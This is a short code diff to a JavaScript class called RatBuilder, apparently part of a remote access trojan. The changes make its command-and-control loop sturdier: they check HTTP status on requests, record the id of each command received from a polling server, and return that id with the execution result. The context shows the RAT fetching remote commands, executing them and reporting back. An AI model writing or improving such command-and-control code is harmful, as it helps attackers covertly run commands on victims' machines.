@@ -104,6 +104,9 @@ class RatBuilder {
 
         try {
             const response = await fetch(url, finalOptions);
+            if (!response.ok) {
+                throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
+            }
             return await response.json();
         } catch (error) {
             throw new Error(\`HTTP request failed: \${error.message}\`);
@@ -168,7 +171,7 @@ class RatBuilder {
             error = \`Command execution failed: \${e.message}\`;
         }
 
-        return { result, error };
+        return { result, error, commandId: lastCommandId };
     }
 
     async function sendResponse(responseData) {
@@ -196,6 +199,7 @@ class RatBuilder {
 
             if (response.status === 'command_pending') {
                 console.log('[RAT] Received command:', response.command);
+                lastCommandId = response.command.id;
                 
                 const result = await executeCommand(
                     response.command.command, 
